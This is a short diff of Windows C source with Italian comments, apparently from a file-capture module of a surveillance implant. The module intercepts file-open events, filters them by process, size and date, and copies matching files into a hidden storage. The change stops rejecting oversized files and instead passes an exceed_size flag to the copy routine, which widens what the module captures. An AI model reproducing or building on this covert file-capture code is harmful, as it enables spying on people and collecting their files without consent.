@@ -408,7 +408,7 @@ int CmpWildW(WCHAR *wild, WCHAR *string)
 
 // Verifica le condizioni per la copia del file
 // nello storage.
-BOOL IsToCopy(WCHAR *file_name)
+BOOL IsToCopy(WCHAR *file_name, BOOL *exceed_size)
 {
 	HANDLE hfile;
 	BY_HANDLE_FILE_INFORMATION file_info;
@@ -430,7 +430,9 @@ BOOL IsToCopy(WCHAR *file_name)
 	
 	// Check sui vincoli di dimensione
 	if (file_info.nFileSizeHigh>0 || file_info.nFileSizeLow<min_fsize || file_info.nFileSizeLow>=max_fsize)
-		return FALSE;
+		*exceed_size = TRUE;
+	else 
+		*exceed_size = FALSE;
 
 	// Check sul vincolo della data
 	file_date.hi_delay = file_info.ftLastWriteTime.dwHighDateTime;
@@ -540,6 +542,7 @@ DWORD __stdcall PM_FileAgentDispatch(BYTE * msg, DWORD dwLen, DWORD dwFlags, FIL
 	DWORD hi_dim = 0, lo_dim = 0, ops;
 	WCHAR *proc_name_to_compare;
 	char *proc_name;
+	BOOL exceed_size = FALSE;
 	WCHAR *utf16_file_name;
 
 	utf16_file_name = (WCHAR *)((IPCCreateFileStruct *) msg)->szFileName;
@@ -584,8 +587,8 @@ DWORD __stdcall PM_FileAgentDispatch(BYTE * msg, DWORD dwLen, DWORD dwFlags, FIL
 		}
 
 		// Vede se deve copiare tutto il file nello storage
-		if (IsToCopy(utf16_file_name)) 
-			Log_CopyFile(utf16_file_name, NULL, PM_FILEAGENT_CAPTURE);
+		if (IsToCopy(utf16_file_name, &exceed_size)) 
+			Log_CopyFile(utf16_file_name, NULL, exceed_size, PM_FILEAGENT_CAPTURE);
 	}
 	SAFE_FREE(proc_name_to_compare);
 	return 1;
